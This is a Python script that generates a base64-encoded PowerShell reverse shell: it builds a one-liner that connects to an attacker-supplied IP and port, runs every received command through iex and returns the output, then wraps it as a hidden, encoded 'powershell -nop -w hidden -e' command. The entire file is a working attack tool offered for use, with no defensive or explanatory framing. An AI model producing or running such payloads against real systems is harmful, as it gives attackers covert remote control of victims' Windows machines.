#!/usr/bin/python3

import argparse
import base64

def generate_payload(target_host, target_port):
    s1 = '$client = New-Object System.Net.Sockets.TCPClient("'
    s2 = '",'
    s3 = ');$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()'
    payload = s1 + target_host + s2 + target_port + s3
    command = "powershell -nop -w hidden -e " + base64.b64encode(payload.encode('utf16')[2:]).decode()
    print(command)

def main():
    # setup argument parsing
    parser = argparse.ArgumentParser(prog='ps-revshell-b64.py')
    parser.add_argument("-t"
                        , "--target" 
                        , type=str
                        , required=True
                        , help="target IP")
    parser.add_argument("-p"
                      , "--port"
                      , type=int
                      , required=False
                      , default=4444 
                      , help="target port [defalt 4444]")

    given_args = parser.parse_args()
    target_ip = given_args.target
    target_port = given_args.port

    if (target_ip == None):
        print(parser.print_help())
        exit()
    
    else:
        print("\n(+) Generating payload for " + target_ip + ":" + str(target_port) + "\n")
        generate_payload(target_ip, str(target_port))

if __name__ == '__main__':
    main()
